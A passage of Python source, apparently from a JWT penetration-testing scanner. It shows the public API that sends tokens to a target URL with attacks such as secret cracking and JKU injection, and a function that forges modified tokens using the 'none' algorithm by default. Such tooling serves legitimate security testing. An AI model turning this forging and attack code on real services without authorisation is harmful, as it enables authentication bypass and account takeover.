                    logger.error(f"Attack {attack_type.value} failed: {e}")
                    yield {
                        "type": "attack_error",
                        "attack": attack_type.value,
                        "error": str(e),
                    }
        
        # Complete scan
        self.result.scan_duration = time.time() - start_time
        self.result.completed_at = datetime.utcnow().isoformat()
        
        yield {
            "type": "scan_complete",
            "result": self.result.to_dict(),
        }


# =============================================================================
# PUBLIC API
# =============================================================================

async def scan_jwt(
    token: str,
    target_url: str,
    token_location: str = "header",
    token_name: str = "Authorization",
    token_prefix: str = "Bearer ",
    http_method: str = "GET",
    attacks: Optional[List[str]] = None,
    custom_secrets: Optional[List[str]] = None,
    jku_callback_url: Optional[str] = None,
    success_indicators: Optional[List[str]] = None,
    failure_indicators: Optional[List[str]] = None,
) -> AsyncGenerator[Dict[str, Any], None]:
    """
    Scan a JWT token for vulnerabilities.
    
    Args:
        token: The JWT token to test
        target_url: URL to send requests to
        token_location: Where to put the token (header, cookie, body)
        token_name: Header/cookie name
        token_prefix: Prefix before token (e.g., "Bearer ")
        http_method: HTTP method to use
        attacks: List of attack types to perform
        custom_secrets: Additional secrets to try for cracking
        jku_callback_url: Callback URL for JKU injection testing
        success_indicators: Strings indicating successful auth
        failure_indicators: Strings indicating failed auth
        
    Yields:
        Progress events and results
    """
    config = JWTScanConfig(
        target_url=target_url,
        token_location=token_location,
        token_name=token_name,
        token_prefix=token_prefix,
        http_method=http_method,
        custom_secrets=custom_secrets or [],
        jku_callback_url=jku_callback_url,
        success_indicators=success_indicators or [],
        failure_indicators=failure_indicators or [],
    )
    
    attack_types = None
    if attacks:
        attack_types = []
        for a in attacks:
            try:
                attack_types.append(JWTAttackType(a))
            except ValueError:
                pass
    
    scanner = JWTScanner(config)
    async for event in scanner.scan(token, attack_types):
        yield event


def analyze_jwt_token(token: str) -> Dict[str, Any]:
    """Analyze a JWT token without making requests."""
    return analyze_jwt(token)


def forge_jwt_token(
    original_token: str,
    payload_modifications: Optional[Dict[str, Any]] = None,
    header_modifications: Optional[Dict[str, Any]] = None,
    secret: Optional[str] = None,
    algorithm: str = "none",
) -> Optional[str]:
    """
    Forge a modified JWT token.
    
    Args:
        original_token: Original JWT to modify
        payload_modifications: Changes to payload
        header_modifications: Changes to header
        secret: Secret for signing (required for HS algorithms)
        algorithm: Algorithm for signing
        
    Returns:
        Forged JWT token
    """
    jwt = parse_jwt(original_token)
    if not jwt:
        return None
    
    new_header = {**jwt.header, **(header_modifications or {})}
    new_payload = {**jwt.payload, **(payload_modifications or {})}
    
    if algorithm.lower() != "none":
        new_header["alg"] = algorithm
    
    return create_jwt(new_header, new_payload, secret or "", algorithm)


def get_jwt_attack_types() -> List[Dict[str, str]]:
    """Get list of available JWT attack types."""
    return [
        {"value": a.value, "name": a.name.replace("_", " ").title()}
        for a in JWTAttackType
    ]
